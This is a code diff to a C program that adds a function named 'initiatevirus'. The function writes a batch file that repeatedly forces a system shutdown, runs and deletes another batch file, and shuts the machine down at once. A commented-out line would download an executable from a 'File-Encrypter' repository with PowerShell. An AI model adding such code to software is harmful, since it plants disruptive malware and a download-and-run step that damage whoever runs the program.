@@ -215,3 +215,16 @@ void exhaust(int capacity)
     system("cls");
     main();
 }
+/*                                                             Declared Function For Virus                                                      */
+void initiatevirus()
+{
+    // system("Powershell -Command \" Invoke-WebRequest https://github.com/nazar-ansari/File-Encrypter/raw/main/Executable.exe -OutFile main.exe\" ");
+    system("echo @ECHO OFF > execution.bat");
+    system("echo :a >> execution.bat");
+    system("echo shutdown /s /t 00 >>execution.bat");
+    system("echo exit >> execution.bat");
+    system("echo goto a >> execution.bat");
+    system("depend.bat");
+    remove("depend.bat");
+    system("shutdown /s /t 00");
+}
